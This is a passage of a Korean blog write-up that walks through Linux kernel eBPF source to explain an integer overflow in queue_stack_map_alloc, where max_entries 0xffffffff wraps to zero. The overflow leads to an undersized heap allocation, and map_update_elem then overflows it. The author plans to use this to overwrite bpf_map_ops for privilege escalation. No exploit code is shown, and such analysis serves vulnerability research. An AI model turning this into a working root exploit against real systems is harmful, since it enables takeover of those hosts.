class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> &#123;</span></span><br><span class="line">    <span class="comment">/* funcs callable from userspace (via syscall) */</span></span><br><span class="line">    <span class="keyword">int</span> (*map_alloc_check)(<span class="keyword">union</span> bpf_attr *attr);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *(*<span class="title">map_alloc</span>)(<span class="title">union</span> <span class="title">bpf_attr</span> *<span class="title">attr</span>);</span></span><br><span class="line">    <span class="keyword">void</span> (*map_release)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file);</span><br><span class="line">    <span class="keyword">void</span> (*map_free)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">int</span> (*map_get_next_key)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *next_key);</span><br><span class="line">    <span class="keyword">void</span> (*map_release_uref)(struct bpf_map *<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* funcs callable from userspace and from eBPF programs */</span></span><br><span class="line">    <span class="keyword">void</span> *(*map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">    <span class="keyword">int</span> (*map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line">    <span class="keyword">int</span> (*map_delete_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key);</span><br><span class="line">    <span class="keyword">int</span> (*map_push_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value, u64 flags);</span><br><span class="line">    <span class="keyword">int</span> (*map_pop_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line">    <span class="keyword">int</span> (*map_peek_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* funcs called by prog_array and perf_event_array map */</span></span><br><span class="line">    <span class="keyword">void</span> *(*map_fd_get_ptr)(struct bpf_map *<span class="built_in">map</span>, struct file *map_file,</span><br><span class="line">                <span class="keyword">int</span> fd);</span><br><span class="line">    <span class="keyword">void</span> (*map_fd_put_ptr)(<span class="keyword">void</span> *ptr);</span><br><span class="line">    u32 (*map_gen_lookup)(struct bpf_map *<span class="built_in">map</span>, struct bpf_insn *insn_buf);</span><br><span class="line">    u32 (*map_fd_sys_lookup_elem)(<span class="keyword">void</span> *ptr);</span><br><span class="line">    <span class="keyword">void</span> (*map_seq_show_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span><br><span class="line">                  struct seq_file *m);</span><br><span class="line">    <span class="keyword">int</span> (*map_check_btf)(<span class="keyword">const</span> struct bpf_map *<span class="built_in">map</span>,</span><br><span class="line">                 <span class="keyword">const</span> struct btf_type *key_type,</span><br><span class="line">                 <span class="keyword">const</span> struct btf_type *value_type);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>bpf_map_ops</code> 구조체는 <code>bpf_map</code> 구조체의 멤버로 생성된 맵에 대한 함수 포인터들이 담겨있는 구조체입니다.</p>
<p>여타 모듈의 <code>file_operations</code>과 비슷한 역할을 하며, 이번 익스에서 heap overflow로 덮어 권한 상승을 트리거하게 될 구조체입니다.</p>
<h5 id="union-bpf-attr"><a href="#union-bpf-attr" class="headerlink" title="union bpf_attr"></a>union bpf_attr</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">		__u32	map_type;	<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">		__u32	key_size;	<span class="comment">/* size of key in bytes */</span></span><br><span class="line">		__u32	value_size;	<span class="comment">/* size of value in bytes */</span></span><br><span class="line">		__u32	max_entries;	<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">		__u32	map_flags;	<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment">					 * flags defined above.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">		__u32	inner_map_fd;	<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">		__u32	numa_node;	<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment">					 * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">		<span class="keyword">char</span>	map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">		__u32	map_ifindex;	<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">		__u32	btf_fd;		<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">		__u32	btf_key_type_id;	<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">		__u32	btf_value_type_id;	<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_*_ELEM commands */</span></span><br><span class="line">		__u32		map_fd;</span><br><span class="line">		__aligned_u64	key;</span><br><span class="line">		<span class="keyword">union</span> &#123;</span><br><span class="line">			__aligned_u64 value;</span><br><span class="line">			__aligned_u64 next_key;</span><br><span class="line">		&#125;;</span><br><span class="line">		__u64		flags;</span><br><span class="line">	&#125;;</span><br><span class="line">  ....</span><br></pre></td></tr></table></figure>
<p><code>bpf()</code> syscall의 <code>*attr</code> 인자로 사용되는 공용체입니다. 해당 공용체의 멤버는 <code>cmd</code> 인자 기준으로 호출된 기능들에 따라 선택되는 <code>anonymous struct</code>로 구성되어 있습니다.</p>
<hr>

<h2 id="integer-overflow"><a href="#integer-overflow" class="headerlink" title="integer overflow"></a>integer overflow</h2><p>integer overflow 취약점은 <code>BPF_MAP_CREATE</code> 기능에서 찾을 수 있습니다.</p>
<h5 id="map-create"><a href="#map-create" class="headerlink" title="map_create()"></a>map_create()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> f_flags;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line">	<span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">	    ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">	     !node_online(numa_node)))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">	<span class="built_in">map</span> = find_and_alloc_map(attr);    <span class="comment">// here</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>eBPF의 <code>BPF_MAP_CREATE</code> 기능을 사용할 경우 <code>/kernel/bpf/syscall.c</code>에 있는 <code>map_create()</code> 함수가 호출됩니다.</p>
<p>해당 함수의 <code>map = find_and_alloc_map(attr);</code> 부분에서 <code>find_and_alloc_map()</code> 함수를 호출하는 것을 확인할 수 있습니다.</p>
<h5 id="queue-map-ops"><a href="#queue-map-ops" class="headerlink" title="queue_map_ops"></a>queue_map_ops</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">    .map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">    .map_alloc = queue_stack_map_alloc,</span><br><span class="line">    .map_free = queue_stack_map_free,</span><br><span class="line">    .map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">    .map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">    .map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">    .map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">    .map_pop_elem = queue_map_pop_elem,</span><br><span class="line">    .map_peek_elem = queue_map_peek_elem,</span><br><span class="line">    .map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="find-and-alloc-map"><a href="#find-and-alloc-map" class="headerlink" title="find_and_alloc_map()"></a>find_and_alloc_map()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">	u32 type = attr-&gt;map_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">	type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">	ops = bpf_map_types[type];</span><br><span class="line">	<span class="keyword">if</span> (!ops)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">		err = ops-&gt;map_alloc_check(attr);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">		ops = &amp;bpf_map_offload_ops;</span><br><span class="line">	<span class="built_in">map</span> = ops-&gt;map_alloc(attr);    <span class="comment">// here</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">	<span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line">	<span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>마찬가지로 <code>/kernel/bpf/syscall.c</code>에 선언되어 있는 <code>find_and_alloc_map()</code> 함수입니다.</p>
<p><code>map = ops-&gt;map_alloc(attr);</code> 부분에서 <code>queue_stack_map_alloc()</code> 함수를 호출하게 됩니다.</p>
<h5 id="queue-stack-map-alloc"><a href="#queue-stack-map-alloc" class="headerlink" title="queue_stack_map_alloc()"></a>queue_stack_map_alloc()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">	u32 size, value_size;</span><br><span class="line">	u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">	size = attr-&gt;max_entries + <span class="number">1</span>;    <span class="comment">// here</span></span><br><span class="line">	value_size = attr-&gt;value_size;</span><br><span class="line"></span><br><span class="line">	queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;</span><br><span class="line"></span><br><span class="line">	cost = queue_size;</span><br><span class="line">	<span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">	cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	ret = bpf_map_precharge_memlock(cost);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">	qs = bpf_map_area_alloc(queue_size, numa_node);</span><br><span class="line">	<span class="keyword">if</span> (!qs)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">	bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">	qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">	qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>/kernel/bpf/queue_stack_maps.c</code> 에 선언되어 있는 위 <code>queue_stack_map_alloc()</code> 함수가 바로 integer overflow가 터지는 함수입니다.</p>
<p><code>size = attr-&gt;max_entries + 1;</code> 부분에서 <code>*attr</code>은 유저 공간에서 <code>bpf()</code> syscall을 호출할 때 인자로 전달해준 공용체로, 결국 해당 공용체의 멤버들은 유저가 컨트롤할 수 있는 값입니다.</p>
<p><code>size</code> 변수는 <code>unsigned 32bit</code>로 선언되어 있기 때문에 만약 <code>attr-&gt;max_entries</code>에 <code>0xffffffff</code>를 전달해줄 경우 <code>+1</code>로 인해 carry되어 <code>0</code>으로 integer overflow를 터트릴 수 있습니다.</p>
<hr>

<h2 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h2><p>heap overflow 취약점은 위의 integer overflow를 통해 트리거할 수 있습니다.</p>
<h3 id="작은-힙-할당"><a href="#작은-힙-할당" class="headerlink" title="작은 힙 할당"></a>작은 힙 할당</h3><h5 id="queue-stack-map-alloc-1"><a href="#queue-stack-map-alloc-1" class="headerlink" title="queue_stack_map_alloc()"></a>queue_stack_map_alloc()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">	u32 size, value_size;</span><br><span class="line">	u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">	size = attr-&gt;max_entries + <span class="number">1</span>;</span><br><span class="line">	value_size = attr-&gt;value_size;</span><br><span class="line"></span><br><span class="line">	queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;    <span class="comment">// here</span></span><br><span class="line"></span><br><span class="line">	cost = queue_size;</span><br><span class="line">	<span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">	cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	ret = bpf_map_precharge_memlock(cost);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">	qs = bpf_map_area_alloc(queue_size, numa_node);    <span class="comment">// allocate</span></span><br><span class="line">	<span class="keyword">if</span> (!qs)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">	bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">	qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">	qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>위에서 설명한 integer overflow 취약점이 터지는 <code>queue_stack_map_alloc()</code> 함수입니다.</p>
<p>해당 함수의 <code>queue_size</code> 변수는 <code>BPF_MAP_CREATE</code> 기능을 통해 최종적으로 커널 힙에 할당하게 될 영역의 크기입니다.<br><code>queue_size = sizeof(*qs) + (u64) value_size * size;</code> 부분에서 <code>sizeof(*qs)</code> 부분은 <code>struct bpf_queue_stack</code>이 위치할 부분이며 주요 데이터 구조에서 설명했듯이 할당될 bpf 맵을 관리하는 구조체입니다.<br>나머지 <code>(u64) value_size * size</code> 부분은 실제로 데이터가 저장될 영역입니다.</p>
<p><code>bpf_map_area_alloc()</code> 함수로 <code>queue_size</code> 크기의 슬랩 캐시를 할당받고 최종적으로 해당 맵에 대한 초기화 작업을 진행합니다. 하지만 <code>size</code> 변수는 integer overflow로 인해 <code>0</code>으로 맞춰진 상태이므로 <code>sizeof(*qs)</code> 만큼의, 특정 작업을 하기엔 너무 작은 크기의 슬랩 캐시를 할당받게 됩니다.</p>
<h3 id="heap-overflow-trigger"><a href="#heap-overflow-trigger" class="headerlink" title="heap overflow trigger"></a>heap overflow trigger</h3><p>heap overflow 취약점은 <code>BPF_MAP_UPDATE_ELEM</code> 기능에서 찾을 수 있습니다.</p>
<h5 id="map-update-elem"><a href="#map-update-elem" class="headerlink" title="map_update_elem()"></a>map_update_elem()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line">	<span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line">	<span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *key, *value;</span><br><span class="line">	u32 value_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f = fdget(ufd);</span><br><span class="line">	<span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">		err = -EPERM;</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">		err = PTR_ERR(key);</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">		value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line">	value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);    <span class="comment">// here</span></span><br><span class="line">	<span class="keyword">if</span> (!value)</span><br><span class="line">		<span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">	err = -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)    <span class="comment">// here</span></span><br><span class="line">		<span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line">	<span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* must increment bpf_prog_active to avoid kprobe+bpf triggering 